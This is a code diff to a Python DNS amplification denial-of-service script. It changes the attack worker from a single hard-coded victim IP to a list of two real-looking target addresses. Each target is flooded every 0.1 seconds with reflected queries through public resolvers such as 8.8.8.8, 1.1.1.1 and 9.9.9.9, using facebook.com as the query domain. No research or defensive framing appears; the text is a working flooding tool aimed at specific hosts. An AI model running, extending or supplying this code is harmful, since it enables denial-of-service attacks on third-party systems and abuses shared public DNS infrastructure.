@@ -112,11 +112,12 @@ def send_amplified_request(target_ip, dns_server, domain):
         print(f"An unexpected error occurred: {e}")
         logging.error("An unexpected error occurred: %s", e)
 
-def worker(target_ip, dns_server, domain):
+def worker(target_ips, dns_server, domain):
     global running
     while running:
-        send_amplified_request(target_ip, dns_server, domain)
-        time.sleep(interval)
+        for target_ip in target_ips:
+            send_amplified_request(target_ip, dns_server, domain)
+            time.sleep(interval)
 
 def is_valid_ip(ip):
     try:
@@ -132,7 +133,7 @@ if __name__ == "__main__":
 
     logging.basicConfig(level=logging.INFO, filename='dns.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s')
 
-    target_ip = "186.249.231.34"
+    target_ip = ["172.67.171.222", "104.21.29.216"]
     dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26"]
     domain = "facebook.com"
     interval = 0.1  # seconds
